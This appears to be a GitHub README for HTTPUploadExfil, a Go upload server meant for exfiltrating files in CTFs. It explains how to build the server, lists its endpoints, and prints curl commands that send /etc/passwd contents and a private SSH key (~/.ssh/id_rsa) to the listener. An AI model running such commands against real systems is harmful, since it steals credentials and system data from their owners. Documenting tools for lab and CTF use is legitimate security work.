# HTTPUploadExfil

`HTTPUploadExfil` is a (very) simple HTTP server written in Go that's useful for getting files (and other information) off a machine using HTTP. While there are many use-cases, it's meant to be used in **low-stakes offensive scenarios** (e.g., CTFs).

Think of this as `python3 -m http.server` but for getting data off a machine instead of on the machine.

Obviously, this is a **very loud** and **somewhat restricted** way of exfiltrating data. Nevertheless, it's quite handy and somewhat easier than, for example, using SMB or FTP.

**TL;DR**

1) Build the tool using `go build`.
2) Run `./httpuploadexfil :1337 /home/kali/loot` on your machine.
3) Access `http://YOUR_IP:1337/` on the machine you need to exfiltrate data from.
4) Find your uploaded files in `/home/kali/loot`.

## Building

It's trivial to build this tool. 

Simply run `go build` within the folder, and you should get an `httpuploadexfil` executable for your platform.

## Usage

The most common use case would be to run the server on *Machine A*. Now, on *Machine B* you access the upload form using a browser and select a file to exfiltrate. Of course, as you can see below, this can also be done using, for example, `curl`.

Aside from uploading files, you can also use `HTTPUploadExfil` to exfiltrate data using simple GET requests. If a request is sent to the `\g` endpoint, the whole request will be stored to disk.

Hence, you can exfiltrate data using the header of the request. It's easiest to use GET parameters (e.g., `?data=...`), but there are other options.

![HTTPUploadExfil](https://github.com/IngoKl/HTTPUploadExfil/blob/main/media/example-1.png?raw=true)

By default, `HTTPUploadExfil` will be served on port 8080. All files will be written to the current directory.

`./httpuploadexfil`

You can also provide some arguments:

`./httpuploadexfil :1337 /home/kali/loot`

The first argument is a bind address, the second one the folder to store files in.

### Endpoints

The webserver exposes three endpoints for you to use:

1) `/` (GET) is the upload form.
2) `/p` (POST) takes the data from the upload form. It requires a `multipart/form-data` request with the `file` field filled.
3) `/g` (GET) will take any GET request and store the full request on the server.

### Shell

Using `Bash`, we can exfil data using GET via, for example:

``echo "data=`cat /etc/passwd`" | curl -d @- http://127.0.0.1:8080/g``

Of course, we can also use `curl` to exfil files:

`curl -F file=@/home/kali/.ssh/id_rsa http://127.0.0.1:8080/p`

## ToDo

* Implement an HTTPs version (Transport Encryption)
